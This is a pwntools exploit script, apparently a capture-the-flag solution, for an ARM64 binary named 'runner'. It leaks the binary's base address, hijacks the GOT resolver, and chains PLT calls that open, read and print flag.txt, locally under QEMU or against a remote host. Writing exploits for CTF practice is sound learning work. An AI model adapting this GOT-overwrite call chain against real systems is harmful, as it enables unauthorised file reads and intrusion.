from pwn import *
from time import sleep

context.clear(arch="arm64")
context.terminal = ["kitty"]

file = ELF("./runner")

env = {}
if args.GDB:
    env["QEMU_GDB"] = "1337"
if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    p = process(["qemu-aarch64", "-strace", "-D", "qemu.log", "-singlestep", "./run"], env=env)

filebase = int(p.recvline().decode().split("-")[0], 16)
resolver = file.get_section_by_name(".got.plt").header.sh_addr + 0x10
overwrite = 0xac
trampoline = file.get_section_by_name(".plt").header.sh_addr + 4

log.info(f"filebase @ {filebase:#x}")
log.info(f"resolver @ {resolver:#x}")

p.sendlineafter(b">", b"0")
p.sendlineafter(b">", f"{filebase + resolver:#x}".encode())

def call(func: str, *args):
    stuff: dict[int, int] = {
        0xd0: filebase + file.got[func],
        0xd8: filebase + trampoline,
    }
    for i in range(len(args)):
        start = 0x40 - (i // 2) * 0x10
        stuff[start + (i % 2) * 8] = args[i]
    return fit(stuff)

payload = fit({
    0x00: overwrite,
    0x08: filebase + file.got.printf,
    0x98: filebase + file.got.printf,
    0xa0: filebase + trampoline,
})
payload += call("read", 0, filebase + file.bss(), 0x100)
payload += call("open", filebase + file.bss(), 0)
payload += call("read", 4, filebase + file.bss(), 0x100)
payload += call("puts", filebase + file.bss())
payload += call("exit", 13)
p.sendlineafter(b">", payload)

sleep(1)

p.sendline(b"flag.txt\x00")

p.interactive()